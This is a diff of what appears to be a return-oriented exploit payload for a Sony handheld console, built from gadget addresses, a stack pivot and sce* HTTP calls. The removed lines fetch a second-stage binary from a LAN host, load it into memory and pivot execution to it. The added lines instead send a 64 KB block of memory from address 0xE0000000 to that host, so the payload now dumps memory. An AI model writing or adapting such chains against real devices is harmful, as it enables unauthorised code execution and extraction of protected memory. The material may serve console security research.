@@ -14,15 +14,20 @@ data
     symbol LDM_ADDR = 0x81204000;
     symbol LDM_ADDR_SP = 0x8120400C;
     symbol LDM_ADDR_PC = 0x81204010;
-    symbol STAGE2_URL = %(writes("http://192.168.109.104:8000/stage2.bin"))s;
-    symbol STAGE2_ADDR = 0x81208000;
+    symbol STAGE2_URL = %(writes("http://192.168.109.104:8080/"))s;
     symbol HTTP_HANDLE = %(writes("AAAAAAAA"))s;
     symbol POP_GADGET = 0x89C004A7;
+
+    symbol HTTPBUF_ADDR = 0x8120C000;
 }
 
 code : entry
 {
     $writedata$
+
+    svc(0x2c0);
+    storeret(HTTPBUF_ADDR);
+    store(0x41414141, HTTPBUF_ADDR+4);
 
     sceHttpCreateTemplate(
         %(writes(""))s /*useragent*/,
@@ -30,18 +35,11 @@ code : entry
         1 /*auto_proxy*/);
 
     sceHttpCreateConnectionWithURL(RET, STAGE2_URL, 0);
-    sceHttpCreateRequestWithURL(RET, 0, STAGE2_URL, 0, 0, 0);
+    sceHttpCreateRequestWithURL(RET, 1, STAGE2_URL, 0, 0, 0x10000);
     storeret(HTTP_HANDLE);
 
     loadret(HTTP_HANDLE);
-    sceHttpSendRequest(RET, 0, 0);
-
-    loadret(HTTP_HANDLE);
-    sceHttpReadData(RET, STAGE2_ADDR, 0x4000);
-
-    store(STAGE2_ADDR, LDM_ADDR_SP);
-    store(POP_GADGET,  LDM_ADDR_PC);
-    pivot(LDM_ADDR);
+    sceHttpSendRequest(RET, 0xE0000000, 0x10000);
 
     infloop(0);
 }
